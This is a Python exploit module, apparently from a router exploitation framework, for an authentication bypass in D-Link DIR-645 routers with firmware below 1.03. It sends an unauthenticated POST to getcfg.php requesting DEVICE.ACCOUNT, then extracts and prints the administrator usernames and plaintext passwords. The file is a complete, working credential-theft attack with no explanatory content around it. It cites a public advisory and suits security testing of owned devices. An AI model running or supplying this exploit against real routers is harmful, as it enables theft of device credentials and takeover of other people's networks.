# Name:D-link DIR-645 authentication bypass
# File:dir645_auth_bypass.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 18.07.2016
# Last modified: 18.07.2016
# Shodan Dork:
# Description: Authentication bypass in D-Link DIR-645, firmware version < 1.03
# Based on: https://packetstormsecurity.com/files/120591/dlinkdir645-bypass.txt

import core.Exploit
import core.io

import requests
import re
from interface.messages import print_error, print_success, print_warning


class Exploit(core.Exploit.RextExploit):
    """
Name:D-link DIR-645 authentication bypass
File:dir645_auth_bypass.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 18.07.2016
Description: Authentication bypass in D-Link DIR-645, firmware version < 1.03
Based on: https://packetstormsecurity.com/files/120591/dlinkdir645-bypass.txt

Options:
    Name        Description

    host        Target host address
    port        Target port
    """

    def __init__(self):
        core.Exploit.RextExploit.__init__(self)

    def do_run(self, e):
        url = "http://%s:%s/getcfg.php" % (self.host, self.port)

        payload = {'SERVICES': 'DEVICE.ACCOUNT'}
        headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                   'Accept-Language': 'Accept-Language: en-us,en;q=0.5',
                   'Accept-Encoding': 'gzip, deflate',
                   'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8'
                   }
        try:
            print_warning("Sending exploit")
            response = requests.post(url, headers=headers, data=payload, timeout=60)
            if "<service>DEVICE.ACCOUNT</service>" in response.text:
                usernames = re.findall("<name>(.*)</name>", response.text)
                passwords = re.findall("<password>(.*)</password>", response.text)

                if "==OoXxGgYy==" in passwords:
                    print_error("Exploit failed, router responded with default value ==OoXxGgYy==")
                else:
                    print_success("")
                    for i in range(len(usernames)):
                        print("Username: " + usernames[i])
                        print("Password: " + passwords[i])
            else:
                print_error("Exploit failed")
        except requests.Timeout:
            print_error("timeout")
        except requests.ConnectionError:
            print_error("exploit failed")
Exploit()
